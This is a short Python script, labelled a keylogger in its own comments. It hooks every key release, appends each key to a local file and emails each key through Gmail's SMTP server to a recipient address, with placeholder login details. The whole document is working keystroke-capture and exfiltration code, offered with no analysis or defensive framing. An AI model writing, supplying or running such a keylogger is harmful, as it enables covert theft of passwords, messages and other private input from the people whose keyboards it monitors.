import keyboard
import smtplib

# Email configuration
email_address = "your_email@example.com"
email_password = "your_email_password"
to_email = "recipient@example.com"

# Keylogger function
def keylogger(event):
    key = event.name
    with open("keylog.txt", "a") as file:
        file.write(key)
    
    # Send email with logged key
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email_address, email_password)
    server.sendmail(email_address, to_email, key)
    server.quit()

# Start keylogger
keyboard.on_release(keylogger)

# Keep the program running
keyboard.wait()

